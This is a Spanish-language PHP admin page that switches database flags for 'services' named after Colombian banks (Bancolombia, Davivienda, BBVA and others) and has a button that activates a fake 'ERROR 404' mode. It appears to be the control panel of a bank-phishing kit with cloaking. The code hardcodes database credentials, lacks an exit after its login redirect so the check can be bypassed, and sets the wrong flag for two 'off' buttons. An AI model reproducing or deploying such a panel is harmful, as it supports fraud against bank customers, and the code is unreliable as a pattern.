<?php

session_start();
if (isset($_SESSION["usuario"])) {
	
}else{	
	header("Location: ../");
}


// Establecer la conexión a la base de datos
$servername = "localhost";
$database = "servient_Luigi21plux";
$username = "servient_Luigi21plux";
$password = "Luigi21plux";

$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar si hay errores de conexión
if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}



if(isset($_POST['offServicios'])){

 // Actualizar el campo "estado" a 0
 $sql = "UPDATE estado_servidor SET estado = 3";
 if ($conn->query($sql) === TRUE) {
    $response = array(
        'status' => 'success',
        'message' => 'Servicio apagado'
      );
 } else {
     echo "Error al actualizar el campo: " . $conn->error;
 }
 
  // Convierte la respuesta a formato JSON
  $json_response = json_encode($response);
}else if(isset($_POST['onServicios'])){
 // Actualizar el campo "estado" a 0
 $sql = "UPDATE estado_servidor SET estado = 1";
 if ($conn->query($sql) === TRUE) {
    $response = array(
        'status' => 'success',
        'message' => 'Servicio Encendido'
      );
 } else {
     echo "Error al actualizar el campo: " . $conn->error;
 }

 $json_response = json_encode($response);

}else if(isset($_POST['onBancolombia'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'bancolombia'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Bancolombia Encendido'
          );
    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['offBancolombia'])){
    $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = 'bancolombia'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Bancolombia apagado'
          );    
        
    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['onAvvillas'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'avvillas'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Avvillas Encendido'
          );
    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }

    $json_response = json_encode($response);

}else if(isset($_POST['offAvvillas'])){
    $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = 'avvillas'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Avvillas apagado'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);
  
}else if(isset($_POST['onColpatria'])){
    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'colpatria'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Colpatria Encendido'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['offColpatria'])){
    $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = 'colpatria'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Colpatria apagado'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);
    
}else if(isset($_POST['onBbva'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'bbva'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'bbva encendido'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['offBbva'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = 'bbva'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Bbva apagado'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);
   
}else if(isset($_POST['onTuya'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'tuya'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Tuya Encendido'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['offTuya'])){
    $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = 'tuya'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Tuya apagado'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['onFalabella'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'falabella'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Falabella Encendido'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['offFalabella'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = 'falabella'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Falabella apagado'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['onOccidente'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'occidente'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Occidente Encendido'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['offOccidente'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 0 WHERE nombre_servicio = 'occidente'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Occidente apagado'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['onBogota'])){

    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'bogota'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'bogota Encendido'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['offBogota'])){
    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'bogota'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Bogota apagado'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['onDavivienda'])){
    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'davivienda'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Davivienda Encendido'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['offDavivienda'])){
    $sql = "UPDATE estado_servicios SET estado_servicio = 1 WHERE nombre_servicio = 'davivienda'";
    if ($conn->query($sql) === TRUE) {
        $response = array(
            'status' => 'success',
            'message' => 'Davivienda apagado'
          );    } else {
        echo "Error al actualizar el campo: " . $conn->error;
    }
    $json_response = json_encode($response);

}else if(isset($_POST['404'])){
     // Actualizar el campo "estado" a 0
 $sql = "UPDATE estado_servidor SET estado = 2";
 if ($conn->query($sql) === TRUE) {
    $response = array(
        'status' => 'success',
        'message' => 'ERROR 404 ACTIVADO'
      );
 } else {
     echo "Error al actualizar el campo: " . $conn->error;
 }
 
  // Convierte la respuesta a formato JSON
  $json_response = json_encode($response);

}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Servicios</title>


    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.css">


    <style>
        .container {
            width: 100%;
            display: flex;
            flex-wrap: wrap;
        }

        .container>div {
            width: 30%;
            text-align: center;
            display: inline-block;
            margin: 10px;
            padding-bottom: 10px;
        }


        :root {
            --bg: #3C465C;
            --primary: #78FFCD;
            --solid: #fff;
            --btn-w: 10em;
            --dot-w: calc(var(--btn-w)*.2);
            --tr-X: calc(var(--btn-w) - var(--dot-w));
        }

        * {
            box-sizing: border-box;
        }

        *:before,
        *:after {
            box-sizing: border-box;
        }

        body {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-flow: wrap;
            background: var(--bg);
            font-size: 20px;
            font-family: 'Titillium Web', sans-serif;
        }

        h1 {
            color: var(--solid);
            font-size: 2.5rem;
            margin-top: 6rem;
        }

        .btn {
            position: relative;
            margin: 0 auto;
            width: var(--btn-w);
            color: var(--primary);
            border: .15em solid var(--primary);
            border-radius: 5em;
            text-transform: uppercase;
            text-align: center;
            font-size: 1.3em;
            line-height: 2em;
            cursor: pointer;
        }

        .dot {
            content: '';
            position: absolute;
            top: 0;
            width: var(--dot-w);
            height: 100%;
            border-radius: 100%;
            transition: all 300ms ease;
            display: none;
        }

        .dot:after {
            content: '';
            position: absolute;
            left: calc(50% - .4em);
            top: -.4em;
            height: .8em;
            width: .8em;
            background: var(--primary);
            border-radius: 1em;
            border: .25em solid var(--solid);
            box-shadow: 0 0 .7em var(--solid),
                0 0 2em var(--primary);
        }

        .btn:hover .dot,
        .btn:focus .dot {
            animation: atom 2s infinite linear;
            display: block;
        }

        @keyframes atom {
            0% {
                transform: translateX(0) rotate(0);
            }

            30% {
                transform: translateX(var(--tr-X)) rotate(0);
            }

            50% {
                transform: translateX(var(--tr-X)) rotate(180deg);
            }

            80% {
                transform: translateX(0) rotate(180deg);
            }

            100% {
                transform: translateX(0) rotate(360deg);
            }
        }


        input {
            background: none;
            border: none;
            font-size: 18px;
            color: white;
            cursor: pointer;
        }
    </style>


</head>

<body>



<form action="" method="post">

    <div class="container">
        <div>
            <h3>Servicios</h3>
            <div class="btn">
                <span><input type="submit" value="Apagar los servicios" name="offServicios"></span>
                <div class="dot"></div>
            </div>
            <br>

             <div class="btn">
             <span><input type="submit" value="encender todos los servicios" name="onServicios"></span>
                <div class="dot"></div>
            </div>
        </div>

        <div>
            <h3>Bancos</h3>
            <div class="btn">
                <span><input type="submit" value="encender Avvillas" name="onAvvillas"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
                <span><input type="submit" value="Apagar Avvillas" name="offAvvillas"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value="Encender Bancolombia" name="onBancolombia"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value="Apagar bancolombia" name="offBancolombia"></span>
                <div class="dot"></div>
            </div>
            <br><div class="btn">
            <span><input type="submit" value="encender Colpatria" name="onColpatria"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value="apagar colpatria" name="offColpatria"></span>
                <div class="dot"></div>
            </div>
            <br><div class="btn">
                <span><input type="submit" value="Apagar bbva" name="offBbva"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value=" encender bbva" name="onBbva"></span>
                <div class="dot"></div>
            </div>
            <br><div class="btn">
                <span><input type="submit" value="Apagar tuya" name="offTuya"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value=" encender tuya" name="onTuya"></span>
                <div class="dot"></div>
            </div>
            <br><div class="btn">
                <span><input type="submit" value="Apagar falabella" name="offFalabella"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value=" encender falabella" name="onFalabella"></span>
                <div class="dot"></div>
            </div>
            <br><div class="btn">
                <span><input type="submit" value="Apagar occidente" name="offOccidente"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value=" encender occidente" name="onOccidente"></span>
                <div class="dot"></div>
            </div>
            <br><div class="btn">
                <span><input type="submit" value="Apagar bogota" name="offBogota"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value=" encender bogota" name="onBogota"></span>
                <div class="dot"></div>
            </div>
            <br><div class="btn">
                <span><input type="submit" value="Apagar davivienda" name="offDavivienda"></span>
                <div class="dot"></div>
            </div>
            <br>
            <div class="btn">
            <span><input type="submit" value=" encender davivienda" name="onDavivienda"></span>
                <div class="dot"></div>
            </div>
            <br>

        </div>

        <div>
            <h3>SERVIDOR</h3>

            <div class="btn">
                <span><input type="submit" value="404" name="404"></span>
                <div class="dot"></div>
            </div>
        </div>
    </div>
    </form>


 <!-- Incluir SweetAlert JS -->
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
  
 <script>
    // Capturar respuesta del servidor
    var response = <?php echo isset($json_response) ? $json_response : 'null'; ?>;
    
    // Mostrar alerta de SweetAlert según el resultado
    if (response !== null) {
      if (response.status === 'success') {
        Swal.fire({
          title: 'Éxito',
          text: response.message,
          icon: 'success',
          confirmButtonText: 'Aceptar'
        });
      } else if (response.status === 'error') {
        Swal.fire({
          title: 'Error',
          text: response.message,
          icon: 'error',
          confirmButtonText: 'Aceptar'
        });
      }
    }
  </script>
</body>

</html>
